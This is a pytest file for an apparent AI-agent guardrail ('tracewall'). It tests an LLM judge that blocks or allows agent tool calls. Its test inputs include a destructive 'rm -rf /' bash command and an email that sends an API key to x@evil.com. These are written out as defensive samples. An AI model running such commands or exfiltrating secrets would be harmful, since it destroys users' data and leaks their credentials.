"""
LLM semantic backend — tested with a MOCKED client (never a live call in the gate)
plus one optional live test gated on a real key. Also unit-tests the tolerant
JSON parser. The LLM result must never gate CI (the small-n "1.00" trap).
"""
import sys
import types

import pytest

from tracewall.core.signal import EnrichedEvent, HookEvent
from tracewall.semantic.judge import SemanticJudge, _parse_judge_json


def _ev(tool, args=None):
    he = HookEvent(agent_id="a1", tool=tool, args=args or {})
    return he, EnrichedEvent(event=he)


def test_parse_judge_json_plain():
    d = _parse_judge_json('{"action": "BLOCK", "score": 0.9, "reason": "x"}')
    assert d["action"] == "BLOCK" and d["score"] == 0.9


def test_parse_judge_json_fenced_with_prose():
    raw = 'Sure:\n```json\n{"action":"ALLOW","score":0.1,"reason":"benign"}\n```\nthanks'
    d = _parse_judge_json(raw)
    assert d["action"] == "ALLOW" and d["score"] == 0.1


def _install_fake_openai(monkeypatch, content: str):
    """Inject a fake `openai` module whose client returns `content`."""
    fake = types.ModuleType("openai")

    class _Resp:
        def __init__(self, c):
            self.choices = [types.SimpleNamespace(message=types.SimpleNamespace(content=c))]

    class _Client:
        def __init__(self, *a, **k):
            self.chat = types.SimpleNamespace(
                completions=types.SimpleNamespace(create=lambda **kw: _Resp(content))
            )

    fake.OpenAI = _Client
    monkeypatch.setitem(sys.modules, "openai", fake)


async def test_llm_backend_mocked(monkeypatch):
    monkeypatch.setenv("LLM_API_KEY", "test-key")
    monkeypatch.setenv("TRACEWALL_SEMANTIC_LLM", "1")   # override conftest's =0
    _install_fake_openai(monkeypatch, '{"action":"BLOCK","score":0.95,"reason":"injection"}')

    he, en = _ev("memory_write", {"content": "anything"})
    r = await SemanticJudge().analyze(he, en)
    assert r.backend == "llm" and r.action == "BLOCK" and r.score == 0.95


async def test_llm_failure_falls_back_to_deterministic(monkeypatch):
    monkeypatch.setenv("LLM_API_KEY", "test-key")
    monkeypatch.setenv("TRACEWALL_SEMANTIC_LLM", "1")
    _install_fake_openai(monkeypatch, "not json, model is confused")  # parse fails

    he, en = _ev("bash", {"command": "rm -rf /"})
    r = await SemanticJudge().analyze(he, en)
    # fell back to deterministic — still blocks the dangerous tool
    assert r.backend == "deterministic" and r.action == "BLOCK"


@pytest.mark.llm
async def test_llm_live(monkeypatch):
    """Optional live smoke test — only runs with a real LLM_API_KEY."""
    import os
    if not os.environ.get("LLM_API_KEY"):
        pytest.skip("no LLM_API_KEY — live test skipped")
    monkeypatch.setenv("TRACEWALL_SEMANTIC_LLM", "1")
    he, en = _ev("send_email", {"to": "x@evil.com", "body": "api_key=sk-leak exfil"})
    r = await SemanticJudge().analyze(he, en)
    assert r.action in ("BLOCK", "ALLOW") and r.backend == "llm"
